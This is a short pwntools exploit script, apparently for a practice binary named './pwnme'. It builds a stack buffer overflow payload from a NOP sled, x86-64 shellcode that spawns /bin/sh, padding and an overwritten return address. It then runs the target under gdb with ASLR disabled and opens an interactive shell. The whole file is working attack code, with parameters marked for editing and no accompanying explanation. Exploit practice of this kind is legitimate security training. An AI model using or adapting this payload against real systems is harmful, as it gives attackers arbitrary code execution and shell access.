from pwn import *

#Edit this
BUFFER_SIZE = 264
OFFSET_BEFORE = 100
ADDRESS = 0x7fffffffe4f0
shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"

context.arch = 'amd64'
context.update(arch='amd64', os='linux')

payload = b"\x90"*OFFSET_BEFORE + shellcode + b"\x90"*(BUFFER_SIZE - OFFSET_BEFORE - len(shellcode)) + p64(ADDRESS)

io = gdb.debug('./pwnme', aslr=False, gdbscript='''
    set follow-fork-mode child
    set disassembly-flavor intel
    define hook-stop
        x/1ig $rip
    end
    b pwnable
    continue
''')

io.sendline(payload)
io.interactive()